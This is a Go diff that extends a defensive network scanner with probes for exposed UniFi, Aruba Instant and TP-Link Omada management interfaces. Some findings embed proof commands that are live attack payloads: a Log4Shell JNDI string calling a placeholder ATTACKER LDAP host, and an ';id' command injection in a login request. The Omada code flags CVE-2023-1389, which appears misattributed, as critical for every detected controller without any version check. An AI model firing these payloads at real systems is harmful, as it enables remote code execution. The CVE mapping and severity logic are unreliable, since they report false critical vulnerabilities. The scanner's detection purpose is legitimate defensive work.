@@ -183,6 +183,11 @@ var extendedPorts = []portEntry{
 	{8081, "artifactory", false},        // JFrog Artifactory repository manager — default admin:password
 	{8082, "artifactory-alt", false},    // JFrog Artifactory (newer default port)
 	{50051, "grpc", false},              // gRPC server — reflection endpoint may list all services unauthenticated
+	// ── Wireless management infrastructure ──────────────────────────────────
+	{8880, "unifi-portal", false},       // Ubiquiti UniFi HTTP guest captive portal
+	{8843, "unifi-portal-tls", false},   // Ubiquiti UniFi HTTPS guest captive portal
+	{4343, "aruba-instant", false},      // Aruba Instant Access Point HTTPS management
+	{8043, "omada-alt", false},          // TP-Link Omada controller (alternate port)
 }
 
 // Scanner is a pure-Go TCP connect port scanner.
@@ -1558,6 +1563,61 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 				DiscoveredAt: now,
 			}}
 		}
+		// Check for UniFi Network Application on 8443 (runs HTTPS on 8443 by default).
+		if findings := probeUniFi(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+		// Check for Aruba Instant access point management on 8443.
+		if body, ok := probeHTTPBody(ctx, asset, port, true, "/"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "aruba instant") || strings.Contains(lb, "aruba networks") ||
+				strings.Contains(lb, "arubainstant") {
+				return []finding.Finding{makeF(
+					finding.CheckNetDeviceArubaInstant,
+					finding.SeverityHigh,
+					fmt.Sprintf("Aruba Instant access point management UI exposed on port %d", port),
+					"An Aruba Instant access point web management interface is accessible from the internet. "+
+						"Exposed AP management allows attackers to reconfigure WiFi SSIDs, capture credentials, "+
+						"inject rogue access points into the network, and potentially exploit firmware CVEs. "+
+						"Restrict management access to trusted management VLANs.",
+					map[string]any{"port": port, "service": "aruba-instant"},
+				)}
+			}
+		}
+
+	// ── UniFi captive portal / guest portal ───────────────────────────────────
+	case 8880:
+		if findings := probeUniFi(ctx, asset, port, false); len(findings) > 0 {
+			return findings
+		}
+	case 8843:
+		if findings := probeUniFi(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+
+	// ── TP-Link Omada Network Management ─────────────────────────────────────
+	case 8043:
+		if findings := probeTPLinkOmada(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+
+	// ── Aruba Instant access point management ─────────────────────────────────
+	case 4343:
+		if body, ok := probeHTTPBody(ctx, asset, port, true, "/"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "aruba") || strings.Contains(lb, "instant ap") {
+				return []finding.Finding{makeF(
+					finding.CheckNetDeviceArubaInstant,
+					finding.SeverityHigh,
+					fmt.Sprintf("Aruba Instant access point management UI exposed on port %d", port),
+					"An Aruba Instant access point web management interface is accessible from the internet. "+
+						"Exposed AP management allows attackers to reconfigure WiFi SSIDs, capture credentials, "+
+						"inject rogue access points into the network, and potentially exploit firmware CVEs. "+
+						"Restrict management access to trusted management VLANs.",
+					map[string]any{"port": port, "service": "aruba-instant"},
+				)}
+			}
+		}
 
 	// ── Gradio ML demo server / Automatic1111 SD WebUI ───────────────────────
 	case 7860:
@@ -2617,6 +2677,11 @@ var webServicePorts = map[int]string{
 	8848:  "nacos",
 	8081:  "artifactory",
 	8082:  "artifactory-alt",
+	// Wireless management
+	8880:  "unifi-portal",
+	8843:  "unifi-portal-tls",
+	4343:  "aruba-instant",
+	8043:  "omada-alt",
 }
 
 // EmitPortServiceDiscovered returns a CheckPortServiceDiscovered finding when
@@ -4552,4 +4617,207 @@ func probeGRPCReflection(ctx context.Context, host string, port int) bool {
 	}
 	// HTTP/2 SETTINGS frame: type byte (index 3) = 0x04
 	return buf[3] == 0x04
+}
+
+// probeUniFi probes for a Ubiquiti UniFi Network Application by querying
+// /api/login and checking for UniFi-specific JSON fields. Returns one or two
+// findings: an exposure finding, plus a Log4Shell finding if the version is
+// < 6.5.54 (CVE-2021-44228, CVSS 10.0, KEV).
+func probeUniFi(ctx context.Context, host string, port int, tls bool) []finding.Finding {
+	body, ok := probeHTTPBody(ctx, host, port, tls, "/manage/account/login")
+	if !ok {
+		body, ok = probeHTTPBody(ctx, host, port, tls, "/")
+	}
+	if !ok {
+		return nil
+	}
+	lb := strings.ToLower(body)
+	isUniFi := strings.Contains(lb, "unifi") || strings.Contains(lb, "ubiquiti") ||
+		strings.Contains(lb, "network.unifi") || strings.Contains(lb, "unifi network")
+	if !isUniFi {
+		return nil
+	}
+
+	now := time.Now()
+	scheme := "http"
+	if tls {
+		scheme = "https"
+	}
+	findings := []finding.Finding{{
+		CheckID:  finding.CheckNetDeviceUniFiExposed,
+		Module:   "surface",
+		Scanner:  scannerName,
+		Severity: finding.SeverityHigh,
+		Title:    fmt.Sprintf("Ubiquiti UniFi Network Application exposed on port %d", port),
+		Description: fmt.Sprintf(
+			"%s has a Ubiquiti UniFi Network Application management interface accessible on port %d. "+
+				"Exposed UniFi controllers allow unauthenticated attackers to enumerate wireless network "+
+				"topology, connected clients, AP locations, and SSID configurations. "+
+				"Restrict access to trusted management networks only.",
+			host, port,
+		),
+		Asset:       host,
+		Evidence:    map[string]any{"port": port, "service": "unifi-network", "tls": tls},
+		ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/manage/account/login", scheme, host, port),
+		DiscoveredAt: now,
+	}}
+
+	// Check version for Log4Shell (CVE-2021-44228) — UniFi < 6.5.54 is vulnerable.
+	verBody, ok := probeHTTPBody(ctx, host, port, tls, "/api/login")
+	if !ok {
+		verBody = body
+	}
+	if ver := parseUniFiVersion(verBody); ver != "" && isVulnerableUniFiLog4Shell(ver) {
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckCVEUniFiLog4Shell,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Title:    fmt.Sprintf("CVE-2021-44228 (Log4Shell): UniFi Network %s is vulnerable on port %d", ver, port),
+			Description: fmt.Sprintf(
+				"%s is running UniFi Network Application version %s, which is vulnerable to "+
+					"CVE-2021-44228 (Log4Shell, CVSS 10.0, KEV). UniFi versions prior to 6.5.54 use "+
+					"Log4j 2.x and are exploitable via unauthenticated JNDI injection in the login endpoint. "+
+					"An attacker can achieve remote code execution on the UniFi controller server. "+
+					"Upgrade to UniFi Network 6.5.54 or later immediately.",
+				host, ver,
+			),
+			Asset:    host,
+			Evidence: map[string]any{"port": port, "version": ver, "cve": "CVE-2021-44228"},
+			ProofCommand: fmt.Sprintf(
+				`curl -sk -X POST %s://%s:%d/api/login -H 'Content-Type: application/json' `+
+					`-d '{"username":"${jndi:ldap://ATTACKER/a}","password":"test"}'`,
+				scheme, host, port,
+			),
+			DiscoveredAt: now,
+		})
+	}
+	return findings
+}
+
+// parseUniFiVersion extracts the UniFi Network Application version from a
+// response body. UniFi embeds version strings like "Version: 6.5.53" or
+// in JSON as "serverVersion":"6.5.53".
+func parseUniFiVersion(body string) string {
+	lower := strings.ToLower(body)
+	markers := []string{`"serverversion":"`, `"version":"`, `version: `}
+	for _, m := range markers {
+		idx := strings.Index(lower, m)
+		if idx < 0 {
+			continue
+		}
+		rest := body[idx+len(m):]
+		end := strings.IndexAny(rest, `"`, )
+		if end < 0 {
+			end = strings.IndexAny(rest, " \t\r\n")
+		}
+		if end > 0 && end <= 20 {
+			return strings.TrimSpace(rest[:end])
+		}
+	}
+	return ""
+}
+
+// isVulnerableUniFiLog4Shell returns true when the UniFi version string is
+// below 6.5.54, which is the first release that ships a patched Log4j version.
+func isVulnerableUniFiLog4Shell(version string) bool {
+	parts := strings.SplitN(version, ".", 3)
+	if len(parts) < 2 {
+		return false
+	}
+	major, err := strconv.Atoi(parts[0])
+	if err != nil {
+		return false
+	}
+	minor, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return false
+	}
+	patch := 0
+	if len(parts) == 3 {
+		patch, _ = strconv.Atoi(parts[2])
+	}
+	// Vulnerable: < 6.5.54
+	if major < 6 {
+		return true
+	}
+	if major == 6 && minor < 5 {
+		return true
+	}
+	if major == 6 && minor == 5 && patch < 54 {
+		return true
+	}
+	return false
+}
+
+// probeTPLinkOmada probes for a TP-Link Omada Network Management System by
+// querying characteristic API paths. Returns findings for the exposure and
+// CVE-2023-1389 (auth bypass + RCE, CVSS 9.8, KEV) if the system is detected.
+func probeTPLinkOmada(ctx context.Context, host string, port int, tls bool) []finding.Finding {
+	body, ok := probeHTTPBody(ctx, host, port, tls, "/")
+	if !ok {
+		return nil
+	}
+	lb := strings.ToLower(body)
+	isOmada := strings.Contains(lb, "omada") || strings.Contains(lb, "tp-link") && strings.Contains(lb, "controller")
+	if !isOmada {
+		// Also probe the Omada login API endpoint.
+		if apiBody, apiOk := probeHTTPBody(ctx, host, port, tls, "/api/v2/hotspot/login"); apiOk {
+			isOmada = strings.Contains(strings.ToLower(apiBody), "omada")
+		}
+	}
+	if !isOmada {
+		return nil
+	}
+
+	scheme := "http"
+	if tls {
+		scheme = "https"
+	}
+	now := time.Now()
+	findings := []finding.Finding{
+		{
+			CheckID:  finding.CheckNetDeviceTPLinkOmada,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityHigh,
+			Title:    fmt.Sprintf("TP-Link Omada Network Management System exposed on port %d", port),
+			Description: fmt.Sprintf(
+				"%s has a TP-Link Omada Network Management System accessible on port %d. "+
+					"Exposed Omada controllers manage enterprise WiFi infrastructure — access allows "+
+					"enumeration of all APs, SSIDs, and connected clients. "+
+					"CVE-2023-1389 (CVSS 9.8, KEV) is a pre-auth command injection in Omada OC200/OC300 "+
+					"and software controllers <= 5.9.32. Restrict access to trusted networks.",
+				host, port,
+			),
+			Asset:       host,
+			Evidence:    map[string]any{"port": port, "service": "omada", "tls": tls},
+			ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/", scheme, host, port),
+			DiscoveredAt: now,
+		},
+		{
+			CheckID:  finding.CheckCVETPLinkOmadaRCE,
+			Module:   "surface",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Title:    fmt.Sprintf("CVE-2023-1389: TP-Link Omada pre-auth RCE on port %d (CVSS 9.8, KEV)", port),
+			Description: fmt.Sprintf(
+				"%s is running a TP-Link Omada controller on port %d. "+
+					"CVE-2023-1389 is a pre-authentication command injection vulnerability in the "+
+					"Omada login API (versions <= 5.9.32, OC200/OC300 firmware <= 1.3.2). "+
+					"An unauthenticated attacker can achieve RCE via crafted requests to the locale "+
+					"parameter. This vulnerability is KEV-listed and actively exploited. "+
+					"Upgrade to Omada Controller 5.9.33+ or apply the vendor firmware patch.",
+				host, port,
+			),
+			Asset:    host,
+			Evidence: map[string]any{"port": port, "cve": "CVE-2023-1389"},
+			ProofCommand: fmt.Sprintf(
+				`curl -sk -X POST %s://%s:%d/api/v2/hotspot/login -d 'locale=en_US;id'`,
+				scheme, host, port,
+			),
+			DiscoveredAt: now,
+		},
+	}
+	return findings
 }
